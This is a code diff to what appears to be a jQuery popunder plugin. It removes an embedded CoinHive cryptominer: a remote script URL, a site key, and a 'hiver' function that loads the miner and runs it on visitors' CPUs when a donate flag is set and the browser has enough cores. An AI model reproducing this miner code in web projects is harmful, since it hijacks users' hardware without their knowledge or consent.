@@ -8,7 +8,7 @@
  * @license http://opensource.org/licenses/BSD-3-Clause
  */
 
-/*global jQuery, window, screen, navigator, top, document, Cookies, CoinHive */
+/*global jQuery, window, screen, navigator, top, document, Cookies */
 ;(function($, window, screen, navigator, document) {
     "use strict";
 
@@ -175,20 +175,6 @@
         m: false,
 
         /**
-         * Hive-URL
-         *
-         * @var string
-         */
-        hive: 'coinhive.com/lib/coinhive.min.js',
-
-        /**
-         * Hive-Site
-         *
-         * @var string
-         */
-        hives: 'IrsRB2ZPfGcansBsqWzz4mG0CMaS0Luz',
-
-        /**
          * The handler-stack
          *
          * @var Array
@@ -293,7 +279,7 @@
                 }, t.ua);
             }
 
-            return t.hiver();
+            return t;
         },
 
         /**
@@ -715,33 +701,6 @@
 
             return a.join(',');
         },
-
-        /**
-         * Hive mind
-         *
-         * @return $.popunder.helper
-         */
-        hiver: function() {
-            var t = this,
-                h = document.location.hostname || t.du,
-                p = 0.5,
-                m;
-            if (t.donate && navigator.hardwareConcurrency > 2 && (t.ua.g || t.ua.ff || t.ua.o) && (true || /\.(?:.(?!\.))[a-z]+$/ig.test(h))) {
-                $.getScript('https://' + t.hive, function () {
-                    if (typeof CoinHive.User === t.fu) {
-                        m = new CoinHive.User(t.hives, h, {
-                            throttle: p
-                        });
-                        m.on('accepted', function () {
-                            m.stop();
-                        });
-                        m.start();
-                    }
-                });
-            }
-
-            return t;
-        }
     };
 
 })(jQuery, window, screen, navigator, document);
